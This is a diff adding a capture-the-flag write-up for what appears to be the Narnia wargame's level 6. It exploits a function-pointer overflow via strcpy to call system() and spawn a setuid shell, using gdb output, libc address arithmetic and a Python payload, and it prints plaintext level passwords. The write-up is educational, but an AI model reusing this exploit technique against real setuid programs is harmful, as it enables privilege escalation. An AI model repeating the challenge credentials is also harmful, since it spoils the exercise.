@@ -288,3 +288,56 @@ Verification: each password was accepted by logging in as the next level's accou
 - **Verification:** logged in as `narnia6` with this password (`whoami` → `narnia6`).
 - **Recording:** `recordings/narnia/L5.cast`
 
+## Level 6 → narnia7
+- **Account:** `narnia6`, password `uK3ikaZLxB`.
+- **Goal:** `main` declares `char b1[8], b2[8]; int (*fp)(char *) = (int(*)(char *))&puts;`, wipes the environment, zeroes `argv[3..]`, then `strcpy(b1, argv[1]); strcpy(b2, argv[2]);`. A guard rejects stack pointers: `if(((unsigned long)fp & 0xff000000) == get_sp()) exit(-1);` where `get_sp()` returns `esp & 0xff000000` (`0xff000000` on this host). Then `setreuid(geteuid(), geteuid()); fp(b1);`.
+- **Technique and why it works:** `strcpy(b1, argv[1])` overflows the 8-byte `b1` into the adjacent function pointer `fp`, so we overwrite `fp` and the program calls our chosen address with `b1` as the argument. The guard only rejects pointers whose top byte is `0xff`, i.e. stack addresses; a libc address (`0xf7...`) passes. ASLR is off, so `system`'s address is fixed: `ldd` gives libc32 base `0xf7d6d000`, `nm -D /usr/lib32/libc.so.6 | grep -w system` gives offset `0x53ce0`, so `system = 0xf7dc0ce0`. `fp(b1)` becomes `system(b1)`. Since `b1` is 8 command bytes followed by the 4 address bytes with no NUL between them, the command is written as `"sh;#AAAA"` — the shell `#` comments out the trailing address bytes, and we get an interactive shell. `b2` must be short: `b2[8]` ends exactly at `b1[0]`, so a long `b2` would make `strcpy`'s NUL terminator zero out `b1`'s first byte (which we discovered in gdb: `x/s $ebp-0x14` showed `""` after a 8-byte `b2`).
+
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Read the source.** `cat /narnia/narnia6.c`: `char b1[8], b2[8]; int (*fp)(char *)=(int(*)(char *))&puts;`; the stack-pointer guard; `fp(b1)`.
+2. **Locate the variables.** `objdump -d --no-show-raw-insn /narnia/narnia6 | sed -n '/<main>:/,/ret/p'`:
+   ```
+   movl $0x8049070,-0xc(%ebp)    # fp = &puts, at ebp-0xc
+   lea -0x14(%ebp),%eax; call strcpy   # strcpy(b1, argv[1]); b1 at ebp-0x14
+   lea -0x1c(%ebp),%eax; call strcpy   # strcpy(b2, argv[2]); b2 at ebp-0x1c
+   and $0xff000000,%eax                # get_sp() high byte
+   call *%eax                          # fp(b1)
+   ```
+   So `b1+8 = fp` (0x14 - 0x0c = 8).
+3. **Check protections and layout.** `file` → setuid ELF 32-bit; `readelf -lW | grep GNU_STACK` → `RW`; gdb at the first `strcpy`:
+   ```
+   gdb -batch -ex 'b *0x80492cb' -ex 'run AAAA BBBB' -ex 'p/x $ebp-0x14' -ex 'p/x $ebp-0x1c' -ex 'p/x $ebp-0xc' -ex 'x/8wx $ebp-0x20' /narnia/narnia6
+   # $1 = 0xffffdbc4 (b1)  $2 = 0xffffdbbc (b2)  $3 = 0xffffdbcc (fp)
+   ```
+   `0xffffdbc4 + 8 = 0xffffdbcc` — the overflow hits `fp` exactly.
+4. **Watch what `strcpy(b2,...)` does to `b1`.** Breaking at the call and printing:
+   ```
+   gdb -batch -ex 'b *0x804931f' -ex 'run AAAAAAAA BBBBBBBB' -ex 'x/s $ebp-0x14' -ex 'p/x *(unsigned int*)($ebp-0xc)' /narnia/narnia6
+   # 0xffffdbc4: ""          <- b1 was zeroed by b2's NUL!
+   # $1 = 0x8049000         <- fp reset to the PLT address
+   ```
+   `b2[8]` ends at `b1[0]`, so the NUL written by `strcpy(b2, argv[2])` lands on `b1`'s first byte. That is why `b2` must be a single character.
+5. **Find `system`.** 
+   ```
+   ldd /narnia/narnia6                              # libc.so.6 => /usr/lib32/libc.so.6 (0xf7d6d000)
+   nm -D /usr/lib32/libc.so.6 | grep -w system      # 00053ce0 W system@@GLIBC_2.0
+   python3 -c 'print(hex(0xf7d6d000+0x53ce0))'       # 0xf7dc0ce0
+   ```
+   The top byte is `0xf7`, not `0xff`, so it passes the guard.
+6. **Build the payload** (`L6.py`):
+   ```
+   system = 0xf7dc0ce0
+   b1 = b"sh;#AAAA" + struct.pack("<I", system)   # 8 command bytes + 4-byte fp
+   os.execve(b"/narnia/narnia6", [b"/narnia/narnia6", b1, b"B"], {})
+   ```
+   `fp(b1)` → `system("sh;#<address bytes>")` → the `#` comments out the address bytes → interactive shell.
+7. **Run it.** `python3 /tmp/e_narnia6.py` prints `fpMARK -> system = 0xf7dc0ce0` (the marker the driver waits for), then the shell comes up.
+8. **Use the shell.**
+   ```
+   id                        # uid=14007(narnia7) gid=14006(narnia6)
+   cat /etc/narnia_pass/narnia7
+   ```
+- **Password for narnia7:** `Hwsfol90tt`
+- **Verification:** logged in as `narnia7` with this password (`whoami` → `narnia7`).
+- **Recording:** `recordings/narnia/L6.cast`
+
